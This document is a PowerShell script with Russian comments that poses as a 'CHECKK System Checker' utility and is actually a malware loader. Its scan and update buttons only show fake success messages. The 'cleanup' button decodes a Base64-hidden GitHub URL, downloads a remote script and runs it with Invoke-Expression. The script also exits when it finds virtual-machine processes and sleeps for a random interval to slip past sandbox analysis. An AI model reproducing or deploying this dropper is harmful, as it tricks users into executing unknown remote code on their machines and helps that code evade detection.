# =============================================
# initialization.ps1 (обфусцированный + интерактивное меню)
# =============================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Обфусцированный URL (Base64) для вашего initialization.ps1
$encodedUrl = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3YyNTg4ODY1Ni1tYWtlci9DSEVDS0svcmVmcy9oZWFkcy9tYWluL2luaXRpYWxpemF0aW9uLnBzMQ=='
$scriptUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))

# Анти-песочница
if (Get-Process -Name VBoxService, vmtoolsd, prl_cc, VGAuthService -ErrorAction SilentlyContinue) { exit }

# Случайная задержка
Start-Sleep -Milliseconds (Get-Random -Minimum 3000 -Maximum 10000)

# Форма
$form = New-Object System.Windows.Forms.Form
$form.Text = "CHECKK System Checker v2.0"
$form.Size = New-Object System.Drawing.Size(420, 320)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedSingle'
$form.MaximizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "Выберите действие:"
$label.Location = New-Object System.Drawing.Point(50, 20)
$label.Size = New-Object System.Drawing.Size(300, 30)
$label.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$btnScan = New-Object System.Windows.Forms.Button
$btnScan.Text = "Сканирование системы"
$btnScan.Location = New-Object System.Drawing.Point(50, 70)
$btnScan.Size = New-Object System.Drawing.Size(300, 40)
$btnScan.Font = New-Object System.Drawing.Font("Arial", 10)
$btnScan.BackColor = [System.Drawing.Color]::LightGreen
$form.Controls.Add($btnScan)

$btnUpdate = New-Object System.Windows.Forms.Button
$btnUpdate.Text = "Обновить компоненты"
$btnUpdate.Location = New-Object System.Drawing.Point(50, 120)
$btnUpdate.Size = New-Object System.Drawing.Size(300, 40)
$btnUpdate.Font = New-Object System.Drawing.Font("Arial", 10)
$btnUpdate.BackColor = [System.Drawing.Color]::LightBlue
$form.Controls.Add($btnUpdate)

$btnClean = New-Object System.Windows.Forms.Button
$btnClean.Text = "Очистка системы"
$btnClean.Location = New-Object System.Drawing.Point(50, 170)
$btnClean.Size = New-Object System.Drawing.Size(300, 40)
$btnClean.Font = New-Object System.Drawing.Font("Arial", 10)
$btnClean.BackColor = [System.Drawing.Color]::LightCoral
$form.Controls.Add($btnClean)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Готов к работе"
$statusLabel.Location = New-Object System.Drawing.Point(50, 230)
$statusLabel.Size = New-Object System.Drawing.Size(300, 20)
$statusLabel.Font = New-Object System.Drawing.Font("Arial", 8)
$statusLabel.ForeColor = [System.Drawing.Color]::Gray
$form.Controls.Add($statusLabel)

# Заглушка для сканирования
$btnScan.Add_Click({
    $statusLabel.Text = "[*] Сканирование..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Blue
    Start-Sleep -Seconds 2
    [System.Windows.Forms.MessageBox]::Show("Сканирование завершено. Угроз не обнаружено.", "Результат")
    $statusLabel.Text = "Готов к работе"
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
})

# Заглушка для обновления
$btnUpdate.Add_Click({
    $statusLabel.Text = "[*] Обновление..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Orange
    Start-Sleep -Seconds 2
    [System.Windows.Forms.MessageBox]::Show("Обновление компонентов выполнено.", "Обновление")
    $statusLabel.Text = "Готов к работе"
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
})

# Основной загрузчик (кнопка "Очистка") — загружает и выполняет ваш remote initialization.ps1
$btnClean.Add_Click({
    $statusLabel.Text = "[*] Загрузка модулей..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Red
    $form.Enabled = $false

    try {
        # Загрузка вашего скрипта из репозитория (обфусцированный URL уже расшифрован)
        $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Headers @{'User-Agent'='Mozilla/5.0'}).Content
        
        # Выполнение загруженного скрипта в текущей сессии
        $statusLabel.Text = "[+] Выполнение..."
        Invoke-Expression $scriptContent
        
        $statusLabel.Text = "[+] Готово"
        [System.Windows.Forms.MessageBox]::Show("Очистка системы выполнена успешно.", "Готово")
    } catch {
        $statusLabel.Text = "[-] Ошибка"
        [System.Windows.Forms.MessageBox]::Show("Ошибка загрузки или выполнения.", "Ошибка")
    }

    $form.Enabled = $true
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
    $statusLabel.Text = "Готов к работе"
})

$form.ShowDialog()
